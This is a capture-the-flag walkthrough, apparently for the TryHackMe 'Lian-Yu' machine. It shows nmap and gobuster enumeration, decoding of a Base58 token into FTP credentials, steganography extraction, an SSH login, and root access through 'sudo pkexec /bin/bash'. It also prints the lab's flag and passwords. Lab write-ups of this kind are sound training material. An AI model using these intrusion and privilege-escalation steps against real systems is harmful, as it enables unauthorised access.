# Lian-Yu

- export IP=10.10.47.181

![image](https://user-images.githubusercontent.com/44063862/83029328-27e9db80-a065-11ea-9c26-76f31a87b355.png)

## Penetration Testing Methodology

**Reconnaissance**
* nmap

**Enumeration**
* Directory Bruteforce using dirbuster & Gobuster

**Exploitation**
* Steganography (xxd, Steghide)

**Privilege Escalation**
* pkexec

**Capturing the flag**
* user.txt
* root.txt
---
 

### 1 nmap scan
```
nmap -sS -sV -A -T4 $IP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-18 02:18 EDT
Nmap scan report for 10.10.47.181
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43081/tcp6  status
|   100024  1          46994/udp   status
|   100024  1          48228/udp6  status
|_  100024  1          52552/tcp   status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   254.58 ms 10.9.0.1
2   255.63 ms 10.10.47.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.59 seconds

**I browse the given IP address.
But, there is nothing interesting. So, I decide to enumerate the directory. By using dirbuster**

### 2 gobuster scan
-1 gobuster dir -u http://10.10.47.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.47.181/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/18 02:24:11 Starting gobuster
===============================================================
/island (Status: 301)
- I get new directory. (http://10.10.47.181/island/)

-- scaning the page /island we got the text 

-  ```Ohhh Noo, Don't Talk...............```

``I wasn't Expecting You at this Moment. I will meet you there``

``You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante``

-2 gobuster dir -u http://10.10.47.181/island -w num_list.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.47.181/island
[+] Threads:        10
[+] Wordlist:       num_list.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/18 03:01:27 Starting gobuster
===============================================================
/2100 (Status: 301)
New directory was found. (http://10.10.47.181/island/2100/).
-  There is hint (.ticket). This hint for us to do another dir enumeration for extension .ticket. This time i gonna use gobuster. Gobuster make it easy for me to specify the extension that i need.

-3 gobuster dir -u http://10.10.47.181/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.47.181/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/18 02:24:11 Starting gobuster
===============================================================
/green_arrow.ticket (Status: 301)
--content:- This is just a token to get into Queen's Gambit(Ship)    RTy8yhBQdscX
- We are given a token RTy8yhBQdscX. Seems like this token was encrypt by something. Fire up CyberChef to decrypt our token. After trying, I found that, it was encrypt by Base58.

![image](https://user-images.githubusercontent.com/44063862/83032542-911f1e00-a068-11ea-99fb-3fbe9632c02f.png)

Output: !#th3h00d

So, I think we have got username and password. Maybe for ftp?

```
ftp 10.10.47.181
```

Username: vigilante
Password: !#th3h00d

Ok, we are in. So, lets dive in. What can we get in here?..

```
ls -al
```

> list all directory or file 

```
get file
```

> download file into our system

So, after ls -al. we can see that, there is 3 image. (Leave_me_alone.png, Queen's Gambit.png and aa.jpg). After download all the file, I try to check each one of it. I have a problem to open Leave_me_alone.png. So, I decide to check the hex using [HxD](https://mh-nexus.de/en/downloads.php?product=HxD20)

![image](https://user-images.githubusercontent.com/44063862/83034288-ac8b2880-a06a-11ea-92b1-239a51b84474.png)

I search the header for PNG. To compare with our picture.

![image](https://user-images.githubusercontent.com/44063862/83034399-c75d9d00-a06a-11ea-9c0f-a2e1a58ac8c6.png)

Seems like we have a wrong header. Repair and save. TA_DAA!!

![image](https://user-images.githubusercontent.com/44063862/83034643-0db2fc00-a06b-11ea-9f80-ce1570a71ec4.png)

He, gave us "password". Is it a password for something? Like ssh.... or.. need to be used for other image? Like steghide??? So, I try steghide for both Queen's Gambit.png and aa.jpg. Success for aa.jpg.

```
steghide extract -sf aa.jpg
```

![image](https://user-images.githubusercontent.com/44063862/83035397-faecf700-a06b-11ea-9ba4-962b744d8df0.png)

```
unzip ss.zip
```

![image](https://user-images.githubusercontent.com/44063862/83035453-0e985d80-a06c-11ea-9c05-6e810bad730c.png)

Unzip the file, give us passwd and shado file.

![image](https://user-images.githubusercontent.com/44063862/83035480-19eb8900-a06c-11ea-8e0e-d1848fddb782.png)

```
cat file
```

We get like a password for shado. And "message" from passwd.txt. I felt im on the dead route. If **M3tahuman** is really a password. But, where can we get the username?? 

So, I decide to open ftp again using gftp. I get that there is another user other than vigilante. (/home/vigilante to /home discovered that there is 2 user). Which is slade and vigilante.

![image](https://user-images.githubusercontent.com/44063862/83035976-b3b33600-a06c-11ea-8c50-3dca2f61d5c2.png)

I try to ssh using slade user. With Password: M3tahuman.

root@kali:~/tryhackme/Lian_Yu# ssh slade@10.10.47.181
slade@10.10.47.181's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

Wahhhhhh, we are in.
-ls discover user.txt file. Cat file give us first flag.
```
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak
```
Next phase is Privilege Escalation

```
sudo -l
```

> To see if there is any command that we can run with root privilege.

![image](https://user-images.githubusercontent.com/44063862/83036417-28867000-a06d-11ea-8596-c9c4f3a0ea98.png)

Seems like, **pkexec** can be run with root privileges. To know more about it we run,

```
man pkexec
```

> pkexec - Execute a command as another user

![image](https://user-images.githubusercontent.com/44063862/83036987-d1cd6600-a06d-11ea-87d2-45dd86e99908.png)

```
sudo pkexec /bin/bash
```

or 

```
sudo /usr/bin/pkexec /bin/bash
```

Successfully change us to root. ls give us root.txt. cat give us our last flag.

![image](https://user-images.githubusercontent.com/44063862/83037039-e27ddc00-a06d-11ea-914d-947c5413b08c.png)

CONGRATULATIONS!! This was a fun machine. Very basic yet fun to root. Good for beginner.

Thank you for reading. :)

**By _sourabh_**
